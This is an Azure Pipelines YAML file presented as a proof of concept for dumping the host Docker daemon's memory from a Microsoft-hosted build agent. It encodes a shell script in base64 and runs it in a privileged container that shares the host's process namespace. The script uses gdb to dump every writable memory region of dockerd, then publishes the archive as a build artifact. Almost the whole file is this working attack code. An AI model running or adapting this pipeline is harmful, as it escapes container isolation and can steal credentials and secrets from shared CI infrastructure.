# A minimal Azure Pipeline to perform a surgical memory dump of the host Docker daemon.
# This runs on a standard Microsoft-hosted agent.

name: Docker Daemon Memory Dump PoC $(Date:yyyyMMdd).$(Rev:.r)
trigger:
- main

pool:
  vmImage: ubuntu-22.04

steps:
- checkout: none # We don't need any source code for this task.

- task: Bash@3
  displayName: 'Attempt Host Docker Daemon Memory Dump'
  inputs:
    targetType: 'inline'
    script: |
      set -e
      DOCKER_DUMP_TGZ="dockerd_memory_dump.tar.gz"

      echo "### [1] Preparing surgical memory dump script... ###"
      DUMP_SCRIPT=$(cat <<'EOF'
        # This script runs inside the privileged container on the runner host.
        echo '--- [ATTACK_CONTAINER] Installing prerequisites (gdb, procps)... ---'
        apk add --no-cache gdb procps

        echo '--- [ATTACK_CONTAINER] Finding host Docker Daemon PID... ---'
        DOCKER_PID=$(pgrep -o dockerd)
        if [ -n "$DOCKER_PID" ]; then
          echo "--- [ATTACK_CONTAINER] Found dockerd at PID $DOCKER_PID. Dumping memory... ---"
          mkdir -p /workspace/memory_dump
          awk '/rw-p/ {split($1,a,"-"); print "dump memory /workspace/memory_dump/" a[1] "-" a[2] ".mem 0x" a[1] " 0x" a[2]}' /proc/$DOCKER_PID/maps > /workspace/gdb_commands.txt
          gdb -p $DOCKER_PID -batch -x /workspace/gdb_commands.txt
          echo '--- [ATTACK_CONTAINER] Memory dump complete. Creating archive... ---'
          tar -czf /workspace/dockerd_memory_dump.tar.gz -C /workspace/memory_dump .
        else
          echo '--- [ATTACK_CONTAINER] CRITICAL FAILURE: Could not find dockerd process. ---'
          exit 1
        fi
      EOF
      )
      ENCODED_SCRIPT=$(echo "${DUMP_SCRIPT}" | base64 -w 0)
      echo "âœ… Dump script prepared and encoded."

      echo -e "\n### [2] Executing payload on the runner host... ###"
      docker run --rm --privileged --pid=host -v "$(Build.SourcesDirectory):/workspace" alpine:latest sh -c \
        "echo ${ENCODED_SCRIPT} | base64 -d | sh"
      echo -e "\n### [3] Payload execution finished. ###"

- task: PublishPipelineArtifact@1
  displayName: 'Publish: Docker Daemon Memory Dump'
  inputs:
    targetPath: $(Build.SourcesDirectory)/dockerd_memory_dump.tar.gz
    artifact: dockerd-memory-dump
